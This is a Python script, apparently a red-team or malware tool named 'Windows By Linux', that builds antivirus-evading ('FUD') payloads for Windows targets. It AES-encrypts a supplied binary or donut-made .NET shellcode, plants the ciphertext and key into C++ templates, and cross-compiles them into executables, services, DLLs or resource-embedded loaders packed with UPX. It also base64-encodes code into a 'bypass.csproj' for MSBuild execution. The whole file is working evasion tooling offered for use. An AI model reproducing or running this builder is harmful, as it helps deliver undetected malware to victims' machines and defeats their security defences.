#!/usr/bin/python

from os import urandom,popen
import subprocess
import sys
import argparse
from Crypto.Cipher import AES
import hashlib
import base64

class wbl:

	def __init__(self,args):

		self.args = args

		self.mingw_path = self.check_mingw()
		self.windres_path = self.check_windres()
		self.upx_path = self.check_upx()

		if (self.mingw_path == ""): 
			print("[!!] ERROR: No path to x86_64-w64-mingw32-g++ found. Exiting.")
			sys.exit(0)
		
		if (self.windres_path == ""):
			print("[!!] ERROR: No path to x86_64-w64-mingw32-windres found. Exiting.")
			sys.exit(0)
		
		if (self.upx_path == ""):
			print("[!!] ERROR: No path to upx found. Exiting.")
			sys.exit(0)
		
		self.payload_key_hex = ""
		self.payload_hex = ""
		self.payload_csproj = ""
		self.donut_shellcode = ""
		
	def check_mingw(self):

		try:
			return str(popen("whereis x86_64-w64-mingw32-g++").read()).strip().split(":")[1].strip().split()[0]

		except Exception as ex:

			print("[!!] check_mingw: %s" % ex)
			sys.exit(0)

	def check_windres(self):

		try:
			return str(popen("whereis x86_64-w64-mingw32-windres").read()).strip().split(":")[1].strip().split()[0]

		except Exception as ex:

			print("[!!] check_windres: %s" % ex)
			sys.exit(0)
	
	def check_upx(self):

		try:
			return str(popen("whereis upx").read()).strip().split(":")[1].strip().split()[0]

		except Exception as ex:

			print("[!!] check_upx: %s" % ex)
			sys.exit(0)

	def create_encrypted_file(self):

		try:
			buf = open(self.args.payload,"rb").read()
		
		except Exception as ex:
			print("\n[!!] ERROR - encrypt_payload_file: Unable to read payload file: %s" % ex)
			sys.exit(0)
    		
		KEY = urandom(16)
		self.payload_key_hex = "0x" + ",0x".join(hex(x)[2:].zfill(2) for x in KEY)
		
		k = hashlib.sha256(KEY).digest()
		iv = 16 * b'\x00'

		pad = 16 - (len(buf) % 16)
		buf += bytes([pad])*pad

		cipher = AES.new(k, AES.MODE_CBC, iv)
		cipher_data = cipher.encrypt(bytes(buf))
		self.payload_hex = "0x" + ",0x".join(hex(x)[2:].zfill(2) for x in cipher_data)

		try: 
			print("[*] Encrypting (AES.MODE_CBC) payload binary file...",end='')
			f = open("./enc.bin",'wb')
			
			f.write(cipher_data)

			f.close()
			print("done (./enc.bin).")

		except Exception as ex:
			print("\n[!!] ERROR - encrypt_payload_file: Unable to create encrypted payload file: %s" % ex)
			sys.exit(0)

		try:
			print("[*] Payload decryption key: {%s}" % self.payload_key_hex)
		
		except Exception as ex:
			print("\n[!!] ERROR - encrypt_payload_file: Unable to output payload decryption key: %s" % ex)
			sys.exit(0)

	def create_donut_shellcode(self):

		try:
			self.donut_shellcode = donut.create(file=self.args.payload, arch=2, cls=self.args.className, method=self.args.methodName);

		except Exception as ex:
			print("\n[!!] ERROR - create_donut_shellcode() - %s" % ex)
			sys.exit(0)

	def create_donut_encrypted_file(self):
		
		KEY = urandom(16)
		self.payload_key_hex = "0x" + ",0x".join(hex(x)[2:].zfill(2) for x in KEY)
	
		k = hashlib.sha256(KEY).digest()
		iv = 16 * b'\x00'

		pad = 16 - (len(self.donut_shellcode) % 16)
		self.donut_shellcode += bytes([pad])*pad

		cipher = AES.new(k, AES.MODE_CBC, iv)
		cipher_data = cipher.encrypt(bytes(self.donut_shellcode))
		self.payload_hex = "0x" + ",0x".join(hex(x)[2:].zfill(2) for x in cipher_data)

		try: 
			print("[*] Encrypting (AES.MODE_CBC) payload binary file...",end='')
			f = open("./enc.bin",'wb')
			
			f.write(cipher_data)

			f.close()
			print("done (./enc.bin).")

		except Exception as ex:
			print("\n[!!] ERROR - encrypt_payload_file: Unable to create encrypted payload file: %s" % ex)
			sys.exit(0)

		try:
			print("[*] Payload decryption key: {%s}" % self.payload_key_hex)
		
		except Exception as ex:
			print("\n[!!] ERROR - encrypt_payload_file: Unable to output payload decryption key: %s" % ex)
			sys.exit(0)

	def create_resource_rc_file(self):

		try:
			with open('./resource.rc','w') as f:

				f.write("#include \"resource.h\"\n")
				f.write("#include \"winres.h\"\n\n")
				f.write("IDR_RCDATA1\t\tRCDATA\t\t\"enc.bin\"\n")

		except Exception as ex:
			print("\n[!!] ERROR - create_resource_file() - %s" % ex)
			sys.exit(0)
	
	def create_resource_h_file(self):

		try:
			with open('./resource.h','w') as f:

				f.write("#define\t\tIDR_RCDATA1\t\t101")

		except Exception as ex:
			print("\n[!!] ERROR - create_resource_file() - %s" % ex)
			sys.exit(0)

	def create_csproj_payload(self):

		flines = ""
		holder = ""

		try:
			with open(self.args.payload,'r') as f:
				flines = f.readlines()
		
		except Exception as ex:
			print("\n[!!] ERROR - create_csproj_payload() - %s" % ex)
			sys.exit(0)

		for line in flines:
			
			line = str(line).rstrip()

			if line[:-1] != ";": line += ";"
			
			holder += line

		self.payload_csproj = base64.b64encode(holder.encode('UTF-16LE'))
	
	def create_payload_file(self):

		flines = ""

		try:

			print("[*] Reading source code template file at %s..." % self.args.template,end='')
			with open(self.args.template,'r') as f:

				flines = f.readlines()
			
			print("done.")

		except Exception as ex:
			
			print("\n[!!] ERROR - create_payload_file() - Reading payload file: %s" % ex)
			sys.exit(0)

		match self.args.build:

			case "exe" | "service-exe" | "dll" | "dotnet-exe" | "dotnet-dll" | "dotnet-service-exe":
			
				try:
					print("[*] Writing source code file with PAYLOADKEY & PAYLOAD replacement...",end='')
					with open("./source.cpp",'w') as nf:

						for line in flines:
							
							if "<<<PAYLOADKEY>>>" in line:  nf.write(line.replace("<<<PAYLOADKEY>>>",self.payload_key_hex))
							elif "<<<PAYLOAD>>>" in line: nf.write(line.replace("<<<PAYLOAD>>>",self.payload_hex))
							else: nf.write(line)

					print("done (./source.cpp).")

				except Exception as ex:
					print("\n[!!] ERROR - create_payload_file() - case exe, service-exe, dll - Create source.cpp file: %s" % ex)
					sys.exit(0)
			
			case "resource-exe" | "resource-service-exe" | "dotnet-resource-exe" | "dotnet-resource-service-exe":
				
				try:
					print("[*] Writing source code file with PAYLOADKEY replacement...",end='')
					with open("./source.cpp",'w') as nf:

						for line in flines:
							
							if "<<<PAYLOADKEY>>>" in line:  nf.write(line.replace("<<<PAYLOADKEY>>>",self.payload_key_hex))
							else: nf.write(line)
							
					print("done (./source.cpp).")

				except Exception as ex:
					print("\n[!!] ERROR - create_payload_file() - case resource-exe, resource-service-exe - Create source.cpp file: %s" % ex)
					sys.exit(0)

			case "csproj":
			
				try:
					print("[*] Writing source code file with PAYLOAD replacement...",end='')
					with open("./bypass.csproj",'w') as nf:

						for line in flines:
							
							if "<<<PAYLOAD>>>" in line:  nf.write(line.replace("<<<PAYLOAD>>>",self.payload_csproj.decode('UTF-8')))
							else: nf.write(line)
					print("done (./bypass.csproj).\n")

				except Exception as ex:
					print("\n[!!] ERROR - create_payload_file() - csproj - Create bypass.csproj file: %s" % ex)
					sys.exit(0)

	def compile_payload_file(self):
		
		try:

			match self.args.build:

				case "exe" | "dotnet-exe": 
					
					print("[*] Compiling the EXE payload file...",end="")
					subprocess.call("%s -fpermissive -Wconversion-null -static-libstdc++ -static-libgcc -o ./payload.exe ./source.cpp" % self.mingw_path,shell=True)
					print("done (./payload.exe).")

					print("[*] Packing the payload file with upx...",end='')
					subprocess.call("%s -qqq ./payload.exe" % self.upx_path,shell=True)
					print("done.\n")

				case "resource-exe" | "dotnet-resource-exe": 
					
					print("[*] Compiling the RESOURCE-EXE payload file...",end="")
					subprocess.call("%s ./resource.rc ./resource.o" % self.windres_path,shell=True)
					subprocess.call("%s -fpermissive -Wconversion-null -static-libstdc++ -static-libgcc -o ./payload.exe ./resource.o ./source.cpp" % self.mingw_path,shell=True)
					print("done (./payload.exe).")

					print("[*] Packing the payload file with upx...",end='')
					subprocess.call("%s -qqq ./payload.exe" % self.upx_path,shell=True)
					print("done.\n")

				case "service-exe" | "dotnet-service-exe": 
					
					print("[*] Compiling the SERVICE-EXE payload file...",end="")
					subprocess.call("%s -fpermissive -Wconversion-null -Wwrite-strings -static-libstdc++ -static-libgcc -o ./payload.exe ./source.cpp" % self.mingw_path,shell=True)
					print("done (./payload.exe).")

					print("[*] Packing the payload file upx...",end='')
					subprocess.call("%s -qqq ./payload.exe" % self.upx_path,shell=True)
					print("done.\n")

				case "resource-service-exe" | "dotnet-resource-service-exe": 
					
					print("[*] Compiling the RESOURCE-SERVICE-EXE payload file...",end="")
					subprocess.call("%s ./resource.rc ./resource.o" % self.windres_path,shell=True)
					subprocess.call("%s -fpermissive -Wconversion-null -Wwrite-strings -static-libstdc++ -static-libgcc -o ./payload.exe ./resource.o ./source.cpp" % self.mingw_path,shell=True)
					print("done (./payload.exe).")

					print("[*] Packing the payload file upx...",end='')
					subprocess.call("%s -qqq ./payload.exe" % self.upx_path,shell=True)
					print("done.\n")

				case "dll" | "dotnet-dll":
					
					print("[*] Compiling the DLL payload file...",end="")
					subprocess.call("%s -fpermissive -Wconversion-null -static-libstdc++ -static-libgcc -shared -o ./payload.dll ./source.cpp" % self.mingw_path,shell=True)
					print("done (./payload.dll).\n")


		except Exception as ex:
			print("[!!] ERROR - compile_payload_file() : %s" % ex)
			sys.exit(0)

if __name__ == '__main__':

	banner = ""
	banner += "▒█░░▒█ ▀█▀ █▀▀▄ █▀▀▄ █▀▀█ █░░░█ █▀▀ ▒█▀▀█ █░░█ ▒█░░░ ░▀░ █▀▀▄ █░░█ █░█ \n"
	banner += "▒█▒█▒█ ▒█░ █░░█ █░░█ █░░█ █▄█▄█ ▀▀█ ▒█▀▀▄ █▄▄█ ▒█░░░ ▀█▀ █░░█ █░░█ ▄▀▄ \n"
	banner += "▒█▄▀▄█ ▄█▄ ▀░░▀ ▀▀▀░ ▀▀▀▀ ░▀░▀░ ▀▀▀ ▒█▄▄█ ▄▄▄█ ▒█▄▄█ ▀▀▀ ▀░░▀ ░▀▀▀ ▀░▀ \n"
	banner += "@badhackjob 07.2022"

	print("\n%s\n" % banner)

	desc = "Windows By Linux (wbl) - Utility to help generate FUD payloads for Windows-based targets.\n"
	desc += "Requires the following: x86_64-w64-mingw32-g++, x86_64-w64-mingw32-windres, upx (for EXE builds only), and the donut Python library (for dotnet-* x64 builds only)."

	parser = argparse.ArgumentParser(description=desc,formatter_class=argparse.RawTextHelpFormatter)
	parser.add_argument('-t',dest='template',help='Full path to source code template.',required=True)
	parser.add_argument('-p',dest='payload',help='Full path to binary payload file. For dotnet-* builds, this switch holds the file path to the .NET (x64) Dll file.',required=True)
	parser.add_argument('-b',dest='build',help='Build Type: exe, service-exe, resource-exe, resource-service-exe, dll, dotnet-exe, dotnet-service-exe, dotnet-dll, dotnet-resource-exe, dotnet-resource-service-exe, and csproj.',required=True)
	parser.add_argument('-c',dest='className',help='Class Name: Required for dotnet-* builds only, specifies the Dll class name to use for payload generation.')
	parser.add_argument('-m',dest='methodName',help='Method Name: Required for dotnet-* builds only, specifies the Dll method name to use for payload generation.')

	args = parser.parse_args()
	
	w = wbl(args)

	print("[*] mingw path %s." % w.mingw_path)
	print("[*] windres path %s." % w.windres_path)
	print("[*] upx path %s.\n" % w.upx_path)

	match w.args.build:

		case "exe" | "service-exe" | "dll":

			w.create_encrypted_file();
			w.create_payload_file();
			w.compile_payload_file();

		case "resource-exe" | "resource-service-exe":

			w.create_encrypted_file();
			w.create_resource_rc_file();
			w.create_resource_h_file();
			w.create_payload_file();
			w.compile_payload_file();
		
		case "csproj":

			w.create_csproj_payload();
			w.create_payload_file();
		
		case "dotnet-exe" | "dotnet-service-exe" | "dotnet-dll":

			try:
				import donut
				print("[*] donut Python library successfully imported.")
				print("[*] %s : %s\n" % (donut.__doc__, donut.__file__, ))
			except Exception as ex:
				print("\n[*] ERROR - Unable to import donut library - required for dotnet-dll build type. %s" % ex)
				sys.exit(0)
			
			if ((w.args.className is None) or (w.args.methodName is None)):
			
				print("[!!] ERROR - Missing one or more parameters for dotnet-dll build type. \n[!!] ERROR - Besides TEMPLATE, BUILD, and PAYLOAD, the CLASSNAME (-c) and METHODNAME (-m) options are also required.\n")
				sys.exit(0)
			
			w.create_donut_shellcode();
			w.create_donut_encrypted_file();
			w.create_payload_file();
			w.compile_payload_file();

		case "dotnet-resource-exe" | "dotnet-resource-service-exe":

			try:
				import donut
				print("[*] donut Python library successfully imported.")
				print("[*] %s : %s\n" % (donut.__doc__, donut.__file__, ))
			except Exception as ex:
				print("\n[*] ERROR - Unable to import donut library - required for dotnet-dll build type. %s" % ex)
				sys.exit(0)
			
			if ((w.args.className is None) or (w.args.methodName is None)):
			
				print("[!!] ERROR - Missing one or more parameters for dotnet-dll build type. \n[!!] ERROR - Besides TEMPLATE, BUILD, and PAYLOAD, the CLASSNAME (-c) and METHODNAME (-m) options are also required.\n")
				sys.exit(0)
			
			w.create_donut_shellcode();
			w.create_donut_encrypted_file();
			w.create_resource_rc_file();
			w.create_resource_h_file();
			w.create_payload_file();
			w.compile_payload_file();

